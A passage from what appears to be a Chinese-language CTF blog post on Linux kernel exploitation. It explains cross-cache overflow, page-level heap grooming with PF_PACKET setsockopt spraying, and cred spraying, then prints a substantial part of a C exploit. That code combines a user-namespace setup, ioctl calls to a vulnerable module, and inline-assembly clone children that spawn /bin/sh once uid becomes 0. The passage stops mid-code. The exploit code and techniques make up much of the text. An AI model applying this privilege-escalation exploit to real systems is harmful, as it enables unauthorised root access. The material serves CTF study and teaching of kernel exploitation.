<h3 id="利用思路-23"><a href="#利用思路-23" class="headerlink" title="利用思路"></a>利用思路</h3><p>由于我们的漏洞对象位于独立的 <code>kmem_cache</code> 中，因此其不会与内核中的其他常用结构体的分配混用，我们无法直接通过 slub 层的堆喷 + 堆风水来溢出到其他结构体来进行下一步利用；同时由于 slub 并不会像 glibc 的ptmalloc2 那样在每个  object 开头都有个存储数据的 header，而是将 next 指针放在一个随机的位置，我们很难直接溢出到下一个 object 的 next 域，由于 hardened freelist 的存在就算我们能溢出到下一个相邻 object 的 next  域也没法构造出一个合法的指针；而在我们的 slub 页面相邻的页面上的数据对我们来说也是未知的，直接溢出的话我们并不知道能够溢出到什么页面上。</p>
<p>让我们把目光重新放到 slub allocator 上，当 freelist page 已经耗空且 partial 链表也为空时（或者 <code>kmem_cache</code> 刚刚创建后进行第一次分配时），其会向 buddy system 申请页面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/yPtXiwzVfxWH7lE-1733799601040-1.png"
                      alt="yPtXiwzVfxWH7lE"
                ></p>
<p>buddy system 的基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同 order 间空闲页面构成双向链表，当低阶  order 的页面不够用时便会从高阶 order 取一份连续内存页拆成两半，其中一半挂回当前请求 order  链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system 页面分配基本原理：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/79biltjNfACIZcP.gif"
                      alt="79biltjNfACIZcP"
                ></p>
<p>我们不难想到的是：从更高阶 order 拆分成的两份低阶 order 的连续内存页<strong>是物理连续的</strong>，若其中的一份被我们的 <code>kmem_cache</code> 取走，而另一份被用于分配其他内核结构体的 <code>kmem_cache</code> 取走，<strong>则我们便有可能溢出到其他的内核结构体上</strong>——这便是 **<code>cross-cache overflow</code>**。</p>
<p>具体的溢出对象也并不难想——6个字节刚好足够我们溢出到 <code>cred</code> 结构体的 <code>uid</code> 字段，完成提权，那么如何溢出到我们想要提权的进程的 cred 结构体呢？我们只需要先 fork() 堆喷 cred 耗尽 <code>cred_jar </code> 中 object，让其向 buddy system 请求新的页面即可，我们还需要先堆喷消耗 buddy system 中原有的页面，之后我们再分配 cred 和题目 object，两者便有较大概率相邻。</p>
<p><code>cred</code> 的大小为 <code>192</code>，<code>cred_jar</code> 向 buddy system 单次请求的页面数量为 1，足够分配 21 个 cred，因此我们不需要堆喷太多 <code>cred</code> 便能耗尽 <code>cred_jar</code>，不过 <code>fork()</code> 在执行过程中会产生很多的”噪声“（即额外分配一些我们不需要的结构体，从而影响页布局），因此这里我们改用 <code>clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND)</code>。</p>
<p>使用 <code>setsockopt()</code> 进行页喷射的方法：当我们创建一个 protocol 为 <code>PF_PACKET</code> 的 socket 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为  <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__sys_setsockopt()</span><br><span class="line">    sock-&gt;ops-&gt;setsockopt()</span><br><span class="line">    	packet_setsockopt() <span class="comment">// case PACKET_TX_RING ↓</span></span><br><span class="line">    		packet_set_ring()</span><br><span class="line">    			alloc_pg_vec()</span><br></pre></td></tr></table></figure></div>

<p>在 <code>alloc_pg_vec()</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 2 order 张内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">	free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">	pg_vec = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>alloc_one_pg_vec_page()</code> 中会直接调用 <code>__get_free_pages()</code> 向 buddy system 请求内存页，因此我们可以利用该函数进行大量的页面请求：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">alloc_one_pg_vec_page</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">	<span class="type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>pgv</code> 中的页面会在 socket 被关闭后释放，这也方便我们后续的页级堆风水，不过需要注意的是低权限用户无法使用该函数，但是我们可以通过开辟新的命名空间来绕过该限制。</p>
<p>这里需要注意的是<strong>我们提权的进程不应当和页喷射的进程在同一命名空间内</strong>，因为后者需要开辟新的命名空间，而我们应当在原本的命名空间完成提权，因此这里选择新开一个进程进行页喷射，并使用管道在主进程与喷射进程间通信。（如果你忘了这一步，就会得到一个 <code>65534</code> 的 uid 然后冥思苦想半天…）。</p>
<p><code>setsockopt()</code>  也可以帮助我们完成<strong>页级堆风水</strong>，当我们耗尽 buddy system 中的 low order pages 后，我们再请求的页面便都是物理连续的，因此此时我们再进行  <code>setsockopt()</code>  便<strong>相当于获取到了一块近乎物理连续的内存</strong>（为什么是”近乎连续“是因为大量的 <code>setsockopt()</code> 流程中同样会分配大量我们不需要的结构体，从而消耗 buddy system 的部分页面）</p>
<p>本题环境中题目的 <code>kmem_cache</code> 单次会向 buddy system 请求一张内存页，而由于 buddy system 遵循 LIFO，因此我们可以：</p>
<ul>
<li>先分配大量的单张内存页，耗尽 buddy 中的 low-order pages。</li>
<li>间隔一张内存页释放掉部分单张内存页，之后堆喷 cred，这样便有几率获取到我们释放的单张内存页。</li>
<li>释放掉之前的间隔内存页，调用漏洞函数分配堆块，这样便有几率获取到我们释放的间隔内存页。</li>
<li>利用模块中漏洞进行越界写，篡改 <code>cred-&gt;uid</code> ，完成提权。</li>
</ul>
<p>我们的子进程需要轮询等待自己的 uid 变为 root，这里选择用一个新的管道在主进程与子进程间通信，当子进程从管道中读出1字节时便开始检查自己是否成功提权，若未提权则直接 sleep 即可。</p>
<h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_CRED_START (PGV_PAGE_NUM / 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_SPRAY_NUM 514</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_NUM 400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_SIZE 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_PER_SLUB 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_SLUB_NUM (VUL_OBJ_NUM / VUL_OBJ_PER_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">castaway_request</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> index;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xCAFEBABE</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int64_t</span> index, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">castaway_request</span> <span class="title">r</span> =</span> &#123;</span><br><span class="line">            .index = index,</span><br><span class="line">            .size = size,</span><br><span class="line">            .buf = buf</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xF00DBABE</span>, &amp;r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> child_pipe_buf[<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> check_root_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="type">char</span> bin_sh_str[] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span> *shell_args[] = &#123;bin_sh_str, <span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">timer</span> =</span> &#123;</span><br><span class="line">        .tv_sec = <span class="number">100000000</span>,</span><br><span class="line">        .tv_nsec = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">waiting_for_root_fn</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    <span class="comment">/* we&#x27;re using the same stack for them, so we need to avoid cracking it.. */</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rax, [check_root_pipe]; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov edi, dword ptr [rax]; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov rsi, child_pipe_buf; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov edx, 1;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   xor eax, eax; &quot;</span> <span class="comment">/* read(check_root_pipe[0], child_pipe_buf, 1)*/</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall;      &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov eax, 102; &quot;</span> <span class="comment">/* getuid() */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   cmp eax, 0; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   jne failed; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rdi, [bin_sh_str];  &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rsi, [shell_args];  &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   xor edx, edx;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov eax, 59;    &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall;        &quot;</span>   <span class="comment">/* execve(&quot;/bin/sh&quot;, args, NULL) */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;failed: &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rdi, [timer]; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   xor esi, esi; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov eax, 35; &quot;</span>  <span class="comment">/* nanosleep() */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">            )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((naked)) <span class="type">long</span> <span class="title function_">simple_clone</span><span class="params">(<span class="type">int</span> flags, <span class="type">int</span> (*fn)(<span class="type">void</span> *))</span> &#123;</span><br><span class="line">    <span class="comment">/* for syscall, it&#x27;s clone(flags, stack, ...) */</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">            <span class="string">&quot; mov r15, rsi; &quot;</span>   <span class="comment">/* save the rsi*/</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor esi, esi; &quot;</span>   <span class="comment">/* set esp and useless args to NULL */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor edx, edx; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor r10d, r10d; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor r8d, r8d;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor r9d, r9d;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; mov eax, 56;  &quot;</span>   <span class="comment">/* __NR_clone */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; syscall;      &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; cmp eax, 0;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; je child_fn;  &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; ret;          &quot;</span>   <span class="comment">/* parent */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;child_fn:      &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; jmp r15;      &quot;</span>   <span class="comment">/* child */</span></span></span><br><span class="line"><span class="params">            )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief create an isolate namespace</span></span><br><span class="line"><span class="comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span></span><br><span class="line"><span class="comment"> * to perform basic exploiting operations in it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> cmd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* operations type */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    CMD_ALLOC_PAGE,</span><br><span class="line">    CMD_FREE_PAGE,</span><br><span class="line">    CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tpacket version for setsockopt */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pipe for cmd communication */</span></span><br><span class="line"><span class="type">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a socket and alloc 